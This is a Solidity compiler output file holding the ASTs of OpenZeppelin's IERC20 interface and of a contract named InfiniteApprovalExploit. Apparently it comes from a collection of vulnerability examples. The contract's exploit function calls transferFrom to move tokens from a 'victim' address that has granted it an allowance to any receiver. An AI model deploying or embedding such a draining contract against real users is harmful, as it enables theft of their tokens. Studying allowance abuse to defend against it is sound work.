					"metadata": "{\"compiler\":{\"version\":\"0.8.29+commit.ab55807c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"victim\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"exploit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":\"InfiniteApprovalExploit\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0xe06a3f08a987af6ad2e1c1e774405d4fe08f1694b67517438b467cecf0da0ef7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://df6f0c459663c9858b6cba2cda1d14a7d05a985bed6d2de72bd8e78c25ee79db\",\"dweb:/ipfs/QmeTTxZ7qVk9rjEv2R4CpCwdf8UMCcRqDNMvzNxHc3Fnn9\"]},\"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":{\"keccak256\":\"0x98951f21a33662251daff4cfb6c9e1376e7d75714ac239b952023148de51da2c\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://bcdb0841f3698501f97c9efd1865303126483f51693f79188e91fbe364d35a36\",\"dweb:/ipfs/QmX16g6yfPUXK2a8QGVSCWeofYtnkjFV1SPBuGTGSZ6usj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							77
						]
					},
					"id": 78,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".20"
							],
							"nodeType": "PragmaDirective",
							"src": "106:24:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IERC20",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "132:71:0",
								"text": " @dev Interface of the ERC-20 standard as defined in the ERC."
							},
							"fullyImplemented": false,
							"id": 77,
							"linearizedBaseContracts": [
								77
							],
							"name": "IERC20",
							"nameLocation": "214:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 3,
										"nodeType": "StructuredDocumentation",
										"src": "227:158:0",
										"text": " @dev Emitted when `value` tokens are moved from one account (`from`) to\n another (`to`).\n Note that `value` may be zero."
									},
									"eventSelector": "ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
									"id": 11,
									"name": "Transfer",
									"nameLocation": "396:8:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"indexed": true,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "421:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "405:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 4,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "405:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"indexed": true,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "443:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "427:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 6,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "427:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 9,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "455:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "447:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 8,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "447:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "404:57:0"
									},
									"src": "390:72:0"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 12,
										"nodeType": "StructuredDocumentation",
										"src": "468:148:0",
										"text": " @dev Emitted when the allowance of a `spender` for an `owner` is set by\n a call to {approve}. `value` is the new allowance."
									},
									"eventSelector": "8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
									"id": 20,
									"name": "Approval",
									"nameLocation": "627:8:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 14,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "652:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "636:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 13,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "636:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 16,
												"indexed": true,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "675:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "659:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 15,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "659:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 18,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "692:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "684:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 17,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "684:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "635:63:0"
									},
									"src": "621:78:0"
								},
								{
									"documentation": {
										"id": 21,
										"nodeType": "StructuredDocumentation",
										"src": "705:65:0",
										"text": " @dev Returns the value of tokens in existence."
									},
									"functionSelector": "18160ddd",
									"id": 26,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nameLocation": "784:11:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "795:2:0"
									},
									"returnParameters": {
										"id": 25,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 24,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 26,
												"src": "821:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 23,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "821:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "820:9:0"
									},
									"scope": 77,
									"src": "775:55:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 27,
										"nodeType": "StructuredDocumentation",
										"src": "836:71:0",
										"text": " @dev Returns the value of tokens owned by `account`."
									},
									"functionSelector": "70a08231",
									"id": 34,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nameLocation": "921:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 29,
												"mutability": "mutable",
												"name": "account",
												"nameLocation": "939:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "931:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 28,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "931:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "930:17:0"
									},
									"returnParameters": {
										"id": 33,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 32,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "971:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 31,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "971:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "970:9:0"
									},
									"scope": 77,
									"src": "912:68:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 35,
										"nodeType": "StructuredDocumentation",
										"src": "986:213:0",
										"text": " @dev Moves a `value` amount of tokens from the caller's account to `to`.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "a9059cbb",
									"id": 44,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nameLocation": "1213:8:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 37,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "1230:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1222:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 36,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1222:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 39,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "1242:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1234:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 38,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1234:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1221:27:0"
									},
									"returnParameters": {
										"id": 43,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 42,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1267:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 41,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1267:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1266:6:0"
									},
									"scope": 77,
									"src": "1204:69:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 45,
										"nodeType": "StructuredDocumentation",
										"src": "1279:264:0",
										"text": " @dev Returns the remaining number of tokens that `spender` will be\n allowed to spend on behalf of `owner` through {transferFrom}. This is\n zero by default.\n This value changes when {approve} or {transferFrom} are called."
									},
									"functionSelector": "dd62ed3e",
									"id": 54,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nameLocation": "1557:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 50,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 47,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "1575:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1567:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 46,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1567:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 49,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "1590:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1582:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 48,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1582:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1566:32:0"
									},
									"returnParameters": {
										"id": 53,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1622:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 51,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1622:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1621:9:0"
									},
									"scope": 77,
									"src": "1548:83:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 55,
										"nodeType": "StructuredDocumentation",
										"src": "1637:667:0",
										"text": " @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n caller's tokens.\n Returns a boolean value indicating whether the operation succeeded.\n IMPORTANT: Beware that changing an allowance with this method brings the risk\n that someone may use both the old and the new allowance by unfortunate\n transaction ordering. One possible solution to mitigate this race\n condition is to first reduce the spender's allowance to 0 and set the\n desired value afterwards:\n https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n Emits an {Approval} event."
									},
									"functionSelector": "095ea7b3",
									"id": 64,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nameLocation": "2318:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 57,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "2334:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2326:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 56,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2326:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 59,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "2351:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2343:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 58,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2343:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2325:32:0"
									},
									"returnParameters": {
										"id": 63,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 62,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2376:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 61,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2376:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2375:6:0"
									},
									"scope": 77,
									"src": "2309:73:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 65,
										"nodeType": "StructuredDocumentation",
										"src": "2388:297:0",
										"text": " @dev Moves a `value` amount of tokens from `from` to `to` using the\n allowance mechanism. `value` is then deducted from the caller's\n allowance.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "23b872dd",
									"id": 76,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nameLocation": "2699:12:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 72,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 67,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "2720:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2712:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 66,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2712:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 69,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "2734:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2726:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 68,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2726:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 71,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "2746:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2738:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 70,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2738:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2711:41:0"
									},
									"returnParameters": {
										"id": 75,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 74,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2771:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 73,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2771:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2770:6:0"
									},
									"scope": 77,
									"src": "2690:87:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 78,
							"src": "204:2575:0",
							"usedErrors": [],
							"usedEvents": [
								11,
								20
							]
						}
					],
					"src": "106:2674:0"
				},
				"id": 0
			},
			"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol": {
				"ast": {
					"absolutePath": "I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol",
					"exportedSymbols": {
						"IERC20": [
							77
						],
						"InfiniteApprovalExploit": [
							102
						]
					},
					"id": 103,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 79,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".20"
							],
							"nodeType": "PragmaDirective",
							"src": "32:24:1"
						},
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"file": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"id": 80,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 103,
							"sourceUnit": 78,
							"src": "58:56:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "InfiniteApprovalExploit",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 102,
							"linearizedBaseContracts": [
								102
							],
							"name": "InfiniteApprovalExploit",
							"nameLocation": "125:23:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 100,
										"nodeType": "Block",
										"src": "246:136:1",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"id": 95,
															"name": "victim",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 84,
															"src": "350:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 96,
															"name": "receiver",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 86,
															"src": "358:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 97,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 88,
															"src": "368:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 92,
																	"name": "token",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 82,
																	"src": "330:5:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 91,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 77,
																"src": "323:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$77_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 93,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "323:13:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$77",
																"typeString": "contract IERC20"
															}
														},
														"id": 94,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "337:12:1",
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 76,
														"src": "323:26:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 98,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "323:52:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 99,
												"nodeType": "ExpressionStatement",
												"src": "323:52:1"
											}
										]
									},
									"functionSelector": "bdc813c4",
									"id": 101,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "exploit",
									"nameLocation": "164:7:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 89,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 82,
												"mutability": "mutable",
												"name": "token",
												"nameLocation": "180:5:1",
												"nodeType": "VariableDeclaration",
												"scope": 101,
												"src": "172:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 81,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "172:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 84,
												"mutability": "mutable",
												"name": "victim",
												"nameLocation": "195:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 101,
												"src": "187:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 83,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "187:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 86,
												"mutability": "mutable",
												"name": "receiver",
												"nameLocation": "211:8:1",
												"nodeType": "VariableDeclaration",
												"scope": 101,
												"src": "203:16:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 85,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "203:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 88,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "229:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 101,
												"src": "221:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 87,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "221:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "171:65:1"
									},
									"returnParameters": {
										"id": 90,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "246:0:1"
									},
									"scope": 102,
									"src": "155:227:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 103,
							"src": "116:268:1",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:353:1"
				},
				"id": 1
			}
		}
	}
}